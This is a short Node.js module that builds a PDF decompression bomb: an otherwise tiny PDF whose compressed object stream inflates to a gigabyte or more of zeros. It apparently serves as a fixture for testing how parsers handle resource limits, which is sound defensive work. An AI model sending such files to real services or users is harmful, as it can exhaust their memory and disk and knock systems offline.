import { createDeflate } from 'node:zlib';

/** Builds a small, structurally valid PDF whose /ObjStm FlateDecode payload inflates to `mebibytes` MiB of zeros. */
export async function buildPdfBomb(mebibytes = 1024, dictionary = '/Type /ObjStm /N 1 /First 4') {
  const deflate = createDeflate({ level: 9 });
  const parts = [];
  deflate.on('data', chunk => parts.push(chunk));
  const done = new Promise((resolve, reject) => { deflate.on('end', resolve); deflate.on('error', reject); });
  const zeros = Buffer.alloc(1024 * 1024);
  deflate.write(Buffer.from('5 0 ')); // object-stream header: "objnum offset" pairs, then the (zero-filled) body
  for (let index = 0; index < mebibytes; index++) {
    if (!deflate.write(zeros)) await new Promise(resolve => deflate.once('drain', resolve));
  }
  deflate.end(); await done;
  const payload = Buffer.concat(parts);
  const head = Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
    + '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] >>\nendobj\n'
    + `4 0 obj\n<< ${dictionary} /Filter /FlateDecode /Length ${payload.length} >>\nstream\n`, 'latin1');
  const tail = Buffer.from('\nendstream\nendobj\ntrailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n', 'latin1');
  return Buffer.concat([head, payload, tail]);
}
